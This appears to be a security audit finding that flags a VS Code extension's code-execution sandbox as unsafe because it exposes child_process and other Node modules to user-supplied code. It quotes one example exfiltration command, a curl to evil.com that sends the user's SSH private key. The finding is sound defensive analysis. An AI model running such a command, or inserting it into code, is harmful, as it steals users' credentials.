## extension.js

Status: UNSAFE

Summary: Exposes child_process in eval sandbox enabling RCE

Details:

The file `extension.js` is a minified JavaScript bundle that defines a VS Code extension for executing arbitrary code in a sandboxed environment. However, it creates a dangerous sandbox using Node.js's `vm` module (`require("vm")`) and exposes powerful built-in modules such as `fs`, `child_process`, `os`, `http`, `https`, `dns`, and others through an allowed module list (`p`). While the code attempts to restrict access via a whitelist, it runs user-provided code in an `async` context with access to `child_process`, which can execute system commands.

The critical issue lies in the command registration for `"antigravity-code-executor.executeCode"`, where user input `e` (the code string) is directly interpolated into an immediately-invoked async function: `(async () => { ${e} })();`. This string is then compiled using `new a.Script(i)` (where `a` is Node's `vm`) and executed via `runInContext(o)`. Even though some restrictions are in place, the presence of `child_process` in the sandbox context means that malicious scripts could spawn processes, read arbitrary files, or exfiltrate data—for example, by running `require('child_process').exec('curl http://evil.com/steal?data=`cat ~/.ssh/id_rsa`')`.

This constitutes a supply-chain risk because the extension enables execution of arbitrary system commands under user control, and there are no sufficient safeguards (like strict AST-based parsing or complete module isolation) to prevent abuse. The exposure of `child_process` in particular transforms this from a safe evaluator into a potential remote code execution vector.
